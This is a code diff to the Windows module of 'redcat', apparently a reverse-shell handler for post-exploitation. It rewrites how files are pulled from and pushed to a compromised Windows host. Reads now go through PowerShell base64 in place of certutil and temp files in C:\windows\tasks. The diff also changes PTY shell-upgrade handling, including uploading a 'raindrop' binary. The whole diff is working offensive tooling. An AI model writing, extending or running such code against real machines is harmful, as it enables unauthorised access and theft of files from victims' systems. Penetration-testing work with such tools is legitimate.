@@ -20,7 +20,12 @@ class Windows(redcat.platform.Platform):
         super().__init__(chan, redcat.platform.WINDOWS)
 
     def build_transaction(self, payload: bytes, start: bytes, end: bytes, control: bytes) -> bytes:
-        return b"echo %b & (%b && echo %b) & echo %b\r\n" % (start, payload, control, end)
+        buffer = b""
+        if self._has_pty:
+            buffer = b"echo %b & (%b && echo %b) & echo %b\r" % (start, payload, control, end)
+        else:
+            buffer = b"echo %b & (%b && echo %b) & echo %b\r\n" % (start, payload, control, end)
+        return buffer
 
     def whoami(self) -> typing.Tuple[bool, bool, str]:
         self.channel.purge()
@@ -38,28 +43,20 @@ class Windows(redcat.platform.Platform):
 
     def download(self, rfile: str) -> typing.Tuple[bool, str, bytes]:
         cmd_success = False
-        rfile = rfile.replace("'", "\"")
         error = redcat.style.bold("failed to download remote file ") + redcat.style.bold(redcat.style.red(f"{rfile}"))
         data = b""
         self.channel.purge()
         with self.channel.transaction_lock:
-            res, cmd_success, data = redcat.transaction.Transaction(f"type {rfile}".encode(), self, True).execute()
+            res, cmd_success, data = redcat.transaction.Transaction(f"dir {rfile}".encode(), self, True).execute()
             if not cmd_success:
                 res = False
                 error = redcat.style.bold("can't download " + redcat.style.red(f"{rfile}") + ": " + data.decode("utf-8"))
             else:
-                tmp_fname = base64.b64encode(os.urandom(16)).decode("utf-8").replace("/", "_").replace("=", "0") + ".tmp"
-                tmp_file = f"\"C:\\windows\\tasks\\{tmp_fname}\""
-                res, cmd_success, data = redcat.transaction.Transaction(f"certutil -encode {rfile} {tmp_file}".encode(), self, True).execute()
+                cmd = f"powershell -c \"[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('{rfile}'))\""
+                res, cmd_success, data = redcat.transaction.Transaction(cmd.encode(), self, True).execute()
                 if res and cmd_success:
-                    res, cmd_success, data = redcat.transaction.Transaction(f"findstr /v CERTIFICATE {tmp_file}".encode(), self, True).execute()
-                    if res and cmd_success:
-                        data = base64.b64decode(data)
-                        error = ""
-                    else:
-                        error = redcat.style.bold("failed to download " + redcat.style.red(f"{rfile}") + ": " + data.decode("utf-8"))
-                    if res:
-                        redcat.transaction.Transaction(f"del {tmp_file}".encode(), self, True).execute()
+                    data = base64.b64decode(data)
+                    error = ""
                 else:
                     error = redcat.style.bold("failed to download " + redcat.style.red(f"{rfile}") + ": " + data.decode("utf-8"))
         return cmd_success, error, data
@@ -101,13 +98,8 @@ class Windows(redcat.platform.Platform):
                 print()
                 if cmd_success:
                     # decode the temporary file into the final file and delete the temporary file
-                    redcat.transaction.Transaction(f"del {rfile}".encode(), self, False).execute()
-                    rfile = rfile.strip("'")
-                    if not rfile.startswith("\""):
-                        rfile = "\"" + rfile
-                    if not rfile.endswith("\""):
-                        rfile += "\""
-                    res, cmd_success, data = redcat.transaction.Transaction(f"certutil -decode {tmp_file} {rfile}".encode(), self, True).execute()
+                    cmd = f"powershell -c \"[System.Convert]::FromBase64String((Get-Content -Path '{tmp_file}')) | Set-Content -Path '{rfile}' -Encoding Byte\""
+                    res, cmd_success, data = redcat.transaction.Transaction(cmd.encode(), self, True).execute()
                 if res:
                     redcat.transaction.Transaction(f"del {tmp_file}".encode(), self, True).execute()
                 if cmd_success:
@@ -125,7 +117,7 @@ class Windows(redcat.platform.Platform):
             with open(raindrop_local_path, "rb") as f:
                 data = f.read()
                 self.send_cmd(f"del {raindrop_remote_path}")
-                cmd_success, error = self.upload(f"'{raindrop_remote_path}'", data)
+                cmd_success, error = self.upload(f"{raindrop_remote_path}", data)
             if cmd_success:
                 success_msg = b"SUCCESS: pty ready!\n"
                 self.channel.purge()
@@ -152,6 +144,7 @@ class Windows(redcat.platform.Platform):
                     self.channel.purge()
                     self.send_cmd("powershell")
                     self.send_cmd("cmd")
+                    self._saved_settings = termios.tcgetattr(sys.stdin.fileno())
             else:
                 error += f"\n{redcat.style.bold('Shell upgrade failed')}"
         return cmd_success, error
@@ -175,6 +168,7 @@ class Windows(redcat.platform.Platform):
                     # use cmd shell when backgrounded
                     # we can't just call exit because user may have called another shell
                     res, _ = self.send_cmd("cmd")
+                    res, _ = self.send_cmd("set PROMPT= ")
                     self.channel.wait_data(1)
                     time.sleep(0.1)
                     self.channel.purge()
